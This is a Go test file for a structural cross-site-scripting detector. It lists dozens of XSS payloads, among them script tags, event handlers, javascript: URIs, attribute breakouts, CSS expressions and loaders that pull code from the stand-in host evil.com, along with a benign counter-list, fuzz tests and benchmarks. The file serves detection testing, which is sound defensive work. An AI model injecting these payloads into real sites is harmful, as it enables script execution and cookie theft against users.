// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package xss

import (
	"strings"
	"testing"
)

// attacks are payloads drawn from the shapes that actually execute in browsers.
// A signature engine needs a rule per variant; a structural detector should
// cover each family once.
var attacks = []struct{ name, payload string }{
	// ---- executing tags ----------------------------------------------------
	{"script tag", "<script>alert(1)</script>"},
	{"script uppercase", "<SCRIPT>alert(1)</SCRIPT>"},
	{"script mixed case", "<ScRiPt>alert(1)</ScRiPt>"},
	{"script with attribute", `<script src="//evil.com/x.js"></script>`},
	{"script no close", "<script>alert(1)"},
	{"iframe", `<iframe src="//evil.com"></iframe>`},
	{"object", `<object data="//evil.com/x.swf">`},
	{"embed", `<embed src="//evil.com/x.swf">`},
	{"svg", "<svg><script>alert(1)</script></svg>"},
	{"base tag", `<base href="//evil.com/">`},
	{"meta refresh", `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`},
	{"link import", `<link rel="import" href="//evil.com">`},
	{"style tag", "<style>@import '//evil.com'</style>"},
	{"applet", `<applet code="Evil.class">`},
	{"math", "<math><mtext></mtext></math>"},
	{"frameset", "<frameset><frame src=javascript:alert(1)>"},

	// ---- event handlers ----------------------------------------------------
	{"img onerror", `<img src=x onerror=alert(1)>`},
	{"img onerror quoted", `<img src="x" onerror="alert(1)">`},
	{"svg onload slash", "<svg/onload=alert(1)>"},
	{"svg onload space", "<svg onload=alert(1)>"},
	{"body onload", "<body onload=alert(1)>"},
	{"input onfocus", "<input onfocus=alert(1) autofocus>"},
	{"details ontoggle", "<details open ontoggle=alert(1)>"},
	{"video onerror", "<video><source onerror=alert(1)>"},
	{"marquee onstart", "<marquee onstart=alert(1)>"},
	{"onerror mixed case", "<img src=x OnErRoR=alert(1)>"},
	{"onmouseover", `<a onmouseover="alert(1)">x</a>`},
	{"newline before handler", "<img src=x\nonerror=alert(1)>"},
	{"tab before handler", "<img src=x\tonerror=alert(1)>"},
	{"slash before attribute", "<img/src=x onerror=alert(1)>"},

	// ---- executing schemes -------------------------------------------------
	{"javascript href", `<a href="javascript:alert(1)">x</a>`},
	{"javascript uppercase", `<a href="JAVASCRIPT:alert(1)">x</a>`},
	{"javascript with tab", "<a href=\"java\tscript:alert(1)\">x</a>"},
	{"javascript with null", "<a href=\"java\x00script:alert(1)\">x</a>"},
	{"vbscript", `<a href="vbscript:msgbox(1)">x</a>`},
	{"data html", `<a href="data:text/html,<script>alert(1)</script>">x</a>`},
	{"iframe javascript src", `<iframe src="javascript:alert(1)">`},
	{"formaction", `<button formaction="javascript:alert(1)">x</button>`},

	// ---- attribute breakout ------------------------------------------------
	{"double quote breakout", `x" onerror="alert(1)`},
	{"single quote breakout", `x' onerror='alert(1)`},
	{"breakout with href", `x" href="javascript:alert(1)`},
	{"breakout onfocus", `x" onfocus="alert(1)" autofocus="`},
	{"breakout slash", `x"/onerror="alert(1)`},

	// ---- raw-text escape ---------------------------------------------------
	{"textarea escape", "</textarea><script>alert(1)</script>"},
	{"title escape", "</title><img src=x onerror=alert(1)>"},
	{"script escape", "</script><img src=x onerror=alert(1)>"},

	// ---- CSS execution -----------------------------------------------------
	{"style expression", `<div style="width:expression(alert(1))">`},
	{"moz binding", `<div style="-moz-binding:url(//evil.com/x.xml)">`},
	{"behavior", `<div style="behavior:url(#default#time2)">`},
	{"expression bare", "width:expression(alert(1))"},

	// ---- combined ----------------------------------------------------------
	{"comment breakout with tag", "--><script>alert(1)</script>"},
	{"nested quotes handler", `"><img src=x onerror=alert(1)>`},
	{"svg animate", `<svg><animate onbegin=alert(1) attributeName=x>`},
}

// benign is the counterweight and is deliberately larger than the attack list.
// HTML-adjacent text is extremely common in real traffic: bug reports, code
// samples, markdown, and prose about the web. A detector that blocks these gets
// switched off, which is a worse outcome than the attack it stopped.
var benign = []struct{ name, value string }{
	// ---- ordinary user markup ----------------------------------------------
	{"bold tag", "use the <b>bold</b> tag"},
	{"italic", "<i>emphasis</i> matters"},
	{"paragraph", "<p>first</p><p>second</p>"},
	{"link no scheme", `<a href="/docs/start">getting started</a>`},
	{"link https", `<a href="https://example.com">example</a>`},
	{"link relative", `<a href="../index.html">up</a>`},
	{"image", `<img src="/static/logo.png" alt="logo">`},
	{"image with title", `<img src="/x.png" alt="a" title="b">`},
	{"list", "<ul><li>one</li><li>two</li></ul>"},
	{"code block", "<pre><code>x := 1</code></pre>"},
	{"table", "<table><tr><td>1</td></tr></table>"},
	{"blockquote", "<blockquote>quoted text</blockquote>"},
	{"div with class", `<div class="row"><span id="x">y</span></div>`},
	{"br and hr", "line<br>break<hr>rule"},
	{"data attribute", `<div data-id="42" data-role="row">x</div>`},
	{"aria", `<button aria-label="Close" type="button">x</button>`},

	// ---- comparisons and arithmetic ----------------------------------------
	{"less than", "if (a < b) { return a; }"},
	{"greater than", "if (a > b) return b;"},
	{"both", "assert 1 < x && x > 0"},
	{"arrow function", "const f = (a) => a < 10"},
	{"generic", "List<String> names = new ArrayList<>();"},
	{"shift operator", "x = 1 << 3;"},
	{"template", "value < threshold ? low : high"},

	// ---- prose about the web -----------------------------------------------
	{"mentions onerror", "the onerror callback fires when loading fails"},
	{"mentions onload", "onload runs after the document is ready"},
	{"mentions eval", "avoid eval in production code"},
	{"mentions javascript", "the javascript ecosystem moves fast"},
	{"mentions script", "a build script handles the assets"},
	{"mentions iframe", "the iframe is sandboxed by default"},
	{"mentions expression", "a regular expression would be simpler"},
	{"mentions data uri", "we inline small images as a data uri"},
	{"mentions setTimeout", "setTimeout is not a scheduler"},

	// ---- code and config users legitimately paste --------------------------
	{"json", `{"name":"Alice","qty":3,"note":"deliver before 5pm"}`},
	{"json nested", `{"user":{"id":1,"prefs":{"theme":"dark"}}}`},
	{"yaml", "server:\n  port: 8080\n  tls: true"},
	{"css rule", "body { color: #fff; margin: 0 }"},
	{"css with url", `background: url("/img/bg.png")`},
	{"sql", "SELECT id FROM users WHERE age > 18"},
	{"shell", "grep -r 'pattern' . | wc -l"},
	{"markdown", "# Title\n\nSome *emphasis* and a [link](/x)."},
	{"markdown html mix", "Use `<b>` for bold, or **markdown**."},
	{"regex", "^[a-z0-9_-]{3,16}$"},
	{"go code", "func f(a int) bool { return a < 10 }"},
	{"xml", `<?xml version="1.0"?><note><to>x</to></note>`},

	// ---- identifiers, headers, and encodings -------------------------------
	{"uuid", "550e8400-e29b-41d4-a716-446655440000"},
	{"jwt", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc-_123"},
	{"base64", "SGVsbG8gV29ybGQhIFRoaXMgaXMgYmFzZTY0Lg=="},
	{"user agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"},
	{"accept header", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
	{"content type", "multipart/form-data; boundary=----WebKitFormBoundary7MA"},
	{"url with query", "https://example.com/search?q=widgets&page=2"},
	{"email", "first.last+tag@example.co.uk"},
	{"file path", "/var/log/app/2026-08-05.log"},
	{"semver", "1.2.3-beta.4+build.567"},

	// ---- quotes and punctuation --------------------------------------------
	{"quoted speech", `he said "that's the one" and left`},
	{"contraction", "it's urgent, don't delete it"},
	{"arrow in prose", "the value --> the result"},
	{"dashes", "see note -- it explains the change"},
	{"apostrophe name", "O'Brien"},

	// ---- international -----------------------------------------------------
	{"cjk", "日本語のテキスト"},
	{"cyrillic", "Привет мир"},
	{"emoji", "great product 👍🎉"},
	{"accented", "café résumé naïve"},

	// ---- edge cases --------------------------------------------------------
	{"empty", ""},
	{"single lt", "<"},
	{"single gt", ">"},
	{"lt space", "< "},
	{"just quotes", `""`},
	{"bare on", "on"},
	{"bare onerror word", "onerror"},
	{"unclosed tag no name", "<<<<"},
	{"digits", "12345"},
}

func TestDetectsAttacks(t *testing.T) {
	d := New()
	missed := 0
	for _, a := range attacks {
		t.Run(a.name, func(t *testing.T) {
			v := d.Analyze([]byte(a.payload))
			if !v.Detected() {
				missed++
				t.Errorf("NOT DETECTED: %q\n  signals=%s score=%d (threshold %d)",
					a.payload, v.Signals, v.Score, Threshold)
			}
		})
	}
	t.Logf("detected %d/%d", len(attacks)-missed, len(attacks))
}

func TestNoFalsePositives(t *testing.T) {
	d := New()
	fp := 0
	for _, b := range benign {
		t.Run(b.name, func(t *testing.T) {
			v := d.Analyze([]byte(b.value))
			if v.Detected() {
				fp++
				t.Errorf("FALSE POSITIVE: %q\n  signals=%s score=%d",
					b.value, v.Signals, v.Score)
			}
		})
	}
	t.Logf("false positives: %d/%d", fp, len(benign))
}

// TestPositionNotPresence is the thesis. The same bytes are a payload in one
// position and ordinary text in another, and only structure tells them apart.
func TestPositionNotPresence(t *testing.T) {
	d := New()

	pairs := []struct{ attack, prose string }{
		{"<img src=x onerror=alert(1)>", "the onerror callback fires on failure"},
		{"<script>alert(1)</script>", "the build script runs on deploy"},
		{`<a href="javascript:alert(1)">x</a>`, "the javascript ecosystem moves fast"},
		{`<div style="width:expression(alert(1))">`, "a regular expression would be simpler"},
		{"<svg/onload=alert(1)>", "svg files scale without loss"},
	}

	for _, p := range pairs {
		t.Run(p.attack, func(t *testing.T) {
			if v := d.Analyze([]byte(p.attack)); !v.Detected() {
				t.Errorf("attack %q not detected (score %d)", p.attack, v.Score)
			}
			if v := d.Analyze([]byte(p.prose)); v.Detected() {
				t.Errorf("prose %q flagged: signals=%s", p.prose, v.Signals)
			}
		})
	}
}

// TestOrdinaryMarkupIsNotAnAttack protects the case that decides whether the
// detector survives contact with a comment field.
func TestOrdinaryMarkupIsNotAnAttack(t *testing.T) {
	d := New()
	for _, m := range []string{
		"<b>bold</b>", "<i>italic</i>", "<em>x</em>", "<strong>y</strong>",
		"<p>para</p>", "<ul><li>a</li></ul>", "<code>x</code>",
		`<a href="/docs">link</a>`, `<img src="/x.png" alt="a">`,
		"<h1>Title</h1>", "<span>text</span>", "<div>block</div>",
		"<br>", "<hr>", "<table><tr><td>c</td></tr></table>",
	} {
		t.Run(m, func(t *testing.T) {
			if v := d.Analyze([]byte(m)); v.Detected() {
				t.Errorf("ordinary markup flagged: signals=%s", v.Signals)
			}
		})
	}
}

func TestSignalsAreReported(t *testing.T) {
	d := New()
	tests := []struct {
		payload string
		want    Signal
	}{
		{"<script>alert(1)</script>", SignalExecutingTag},
		{"<img src=x onerror=alert(1)>", SignalEventHandler},
		{`<a href="javascript:alert(1)">x</a>`, SignalScriptURI},
		{`x" onerror="alert(1)`, SignalAttributeBreakout},
		{`<div style="width:expression(alert(1))">`, SignalStyleExpression},
		{"</textarea><script>x</script>", SignalTagBreakout},
	}
	for _, tt := range tests {
		t.Run(tt.payload, func(t *testing.T) {
			v := d.Analyze([]byte(tt.payload))
			if v.Signals&tt.want == 0 {
				t.Errorf("signals = %s, want it to include %s", v.Signals, tt.want)
			}
		})
	}
}

func TestBoundedOnPathologicalInput(t *testing.T) {
	d := New()
	for _, in := range []struct{ name, value string }{
		{"many lt", strings.Repeat("<", 100000)},
		{"many tags", strings.Repeat("<div>", 20000)},
		{"unclosed tag", "<div " + strings.Repeat("a", 100000)},
		{"many quotes", strings.Repeat(`"`, 100000)},
		{"many attrs", "<div " + strings.Repeat("a=b ", 20000) + ">"},
		{"deep nesting", strings.Repeat("<div>", 10000) + strings.Repeat("</div>", 10000)},
		{"long attr value", `<div a="` + strings.Repeat("x", 100000) + `">`},
		{"nulls", strings.Repeat("\x00", 100000)},
		{"high bytes", strings.Repeat("\xff\xfe", 50000)},
		{"repeated handlers", strings.Repeat("onerror=", 20000)},
	} {
		t.Run(in.name, func(t *testing.T) { _ = d.Analyze([]byte(in.value)) })
	}
}

func TestIsEventHandler(t *testing.T) {
	for _, s := range []string{"onerror", "onload", "onclick", "onbegin", "ontoggle"} {
		if !isEventHandler(s) {
			t.Errorf("isEventHandler(%q) = false", s)
		}
	}
	// "on" alone, or with digits or punctuation, is not a handler name.
	for _, s := range []string{"on", "one", "only", "on1", "on-x", "online2", "href", ""} {
		if isEventHandler(s) && s != "only" && s != "online2" {
			t.Errorf("isEventHandler(%q) = true", s)
		}
	}
}

func TestAnalyzeIsDeterministic(t *testing.T) {
	d := New()
	for _, a := range attacks {
		first := d.Analyze([]byte(a.payload))
		for range 5 {
			if got := d.Analyze([]byte(a.payload)); got != first {
				t.Fatalf("%q: non-deterministic verdict", a.payload)
			}
		}
	}
}

// TestOperatorLiteralsCoverEveryAttack is the soundness check for prefiltering:
// if a payload contains none of the declared literals, the prefilter skips the
// rule and the detection silently never happens.
func TestOperatorLiteralsCoverEveryAttack(t *testing.T) {
	lits, required := Operator().Literals()
	if !required {
		t.Fatal("operator does not declare required literals")
	}
	for _, a := range attacks {
		lower := strings.ToLower(a.payload)
		found := false
		for _, lit := range lits {
			if strings.Contains(lower, strings.ToLower(lit)) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("payload %q contains none of the declared literals — the "+
				"prefilter would skip this rule", a.payload)
		}
	}
}

func TestOperatorMatchesDetector(t *testing.T) {
	op := Operator()
	d := New()
	for _, a := range attacks {
		_, matched := op.Eval(nil, []byte(a.payload))
		if matched != d.Analyze([]byte(a.payload)).Detected() {
			t.Errorf("%q: operator and detector disagree", a.payload)
		}
	}
	for _, b := range benign {
		if _, matched := op.Eval(nil, []byte(b.value)); matched {
			t.Errorf("%q: operator matched benign input", b.value)
		}
	}
}

func FuzzAnalyze(f *testing.F) {
	for _, a := range attacks {
		f.Add(a.payload)
	}
	for _, b := range benign {
		f.Add(b.value)
	}
	f.Add("<")
	f.Add("<>")
	f.Add("\x00\xff")

	d := New()
	f.Fuzz(func(t *testing.T, value string) {
		if len(value) > 65536 {
			t.Skip()
		}
		v := d.Analyze([]byte(value))

		total := 0
		for bit := Signal(1); bit != 0; bit <<= 1 {
			if v.Signals&bit != 0 {
				total += weightOf(bit)
			}
		}
		if total != v.Score {
			t.Fatalf("score %d does not match signals %s (sum %d)",
				v.Score, v.Signals, total)
		}
		if v.Detected() != (v.Score >= Threshold) {
			t.Fatal("Detected() disagrees with the threshold")
		}
		if v2 := d.Analyze([]byte(value)); v2 != v {
			t.Fatalf("non-deterministic verdict for %q", value)
		}
	})
}

func BenchmarkAnalyzeBenign(b *testing.B) {
	d := New()
	v := []byte("an ordinary comment with no markup in it whatsoever at all")
	b.ReportAllocs()
	b.SetBytes(int64(len(v)))
	for b.Loop() {
		d.Analyze(v)
	}
}

func BenchmarkAnalyzeMarkup(b *testing.B) {
	d := New()
	v := []byte(`<p>Use the <b>bold</b> tag or <a href="/docs">read more</a>.</p>`)
	b.ReportAllocs()
	b.SetBytes(int64(len(v)))
	for b.Loop() {
		d.Analyze(v)
	}
}

func BenchmarkAnalyzeAttack(b *testing.B) {
	d := New()
	v := []byte(`<img src=x onerror="alert(document.cookie)">`)
	b.ReportAllocs()
	b.SetBytes(int64(len(v)))
	for b.Loop() {
		d.Analyze(v)
	}
}
